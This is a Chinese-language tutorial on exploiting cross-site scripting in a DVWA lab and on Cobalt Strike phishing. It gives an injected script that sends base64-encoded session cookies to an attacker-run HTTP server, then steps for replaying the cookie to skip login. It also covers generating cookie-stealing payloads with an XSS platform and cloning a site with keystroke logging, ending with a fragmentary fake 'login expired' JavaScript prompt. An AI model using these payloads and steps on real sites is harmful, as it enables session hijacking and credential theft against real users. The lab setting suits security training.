    # 跨站脚本攻击漏洞实战利用

    # 利用XSS漏洞获取cookie

    # 方式一
    使用kali开启http服务，命令为：python3 -m http.server 5555
    1

    再往存在csrf漏洞的地方出入如下代码

    <script>
window.open('http://192.168.123.132:5555/?q='+btoa(document.cookie))
</script>
    1
    2
    3

    这时页面就会跳转到这来，这样显然是很明显的

    返回去看看kali的服务端

    收集到一串base64编码的cookie值

    UEhQU0VTU0lEPWQwYzlqdDBlNWx2OWlzanBtaG9xZ29nOW02OyBzZWN1cml0eT1sb3c=

    经过解码后可得

    PHPSESSID=d0c9jt0e5lv9isjpmhoqgog9m6; security=low

    用火狐浏览器进入此时是需要登录的

    换成这样后，然后进入http://localhost:8888/vulnerabilities/xss_r/页面

    然后这样就能无登录进来了

    # 方式二

    利用清华大学蓝莲花战队开发的xss平台进行利用

    • 平台搭建

    直接从github下载一个完整版的放到phpstudy里

    然后把config-sample.php改为config.php并且把install.php删除掉，跳转到login.php即可使用

    • 点击我的js

      插入default模板，把上面的website=改成目标网站，这里为dvwa的网站

    点击生成payload

    把payload框内的内容复制到dvwa存在DOM型漏洞处

    提交之后弹出窗口，切回蓝莲花就会发现有接收到cookie值，拿着cookie值执行上面同样的操作即可登录。

    # cobalt strike 钓鱼

    # 1.打开kali，在cs4.4的目录下给予teamserver执行权限并且执行开启服务端

    命令如下：

    chmod +x teamserver 
sudo ./teamserver 服务机ip 自己设置的密码 
eg: sudo ./teamserver 192.168.123.132 qqq111
    1
    2
    3

    # 2. 再打开一个命令框，给予cobaltstrike执行权限并执行

    chmod +x cobaltstrike

    sudo ./cobaltstrike

    这时会弹出一个弹窗

    • 主机填服务机ip
    • 端口若没设置默认为50050
    • 用户可自己随便改，但密码是开启服务机的时候设置的密码

    # 3.制作钓鱼网站

    (1)点击攻击 ->钓鱼攻击->克隆网站->打开web日志

    (2)把要克隆的网址复制上去，设置好本地ip和端口，勾上logkeystone on cloned site

    (3)在网站创建一个test.js

    window.alert = function(name){

iframe.parentNode.removeChild(iframe);
}
confirm("登录过期请重新登录!");
